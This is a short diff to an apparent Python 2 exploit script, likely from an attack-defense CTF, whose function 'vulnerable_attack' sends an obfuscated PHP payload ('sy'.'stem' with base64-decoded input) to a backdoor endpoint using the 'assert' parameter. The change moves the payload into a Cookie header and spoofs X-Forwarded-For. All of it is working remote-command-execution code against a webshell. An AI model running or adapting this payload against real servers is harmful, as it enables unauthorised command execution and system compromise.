@@ -21,8 +21,10 @@ def vulnerable_attack(target,target_port,cmd):
         #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
         #print payload
         payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
-        data = '222=%s'% quote(payload) 
-        res = http("post",target,target_port,"/1.php",data,headers)
+        data = 'cmd=%s'% (payload) 
+        headers['Cookie'] = data
+        headers['X-Forwarded-For'] = '8.8.8.8'
+        res = http("post",target,target_port,"/admin/login/backdoor?hongkexueyuan=assert",data,headers)
     except Exception,e:
         debug_print(traceback.format_exc())     
         dump_error("attack failed",target,"vulnerable attack")
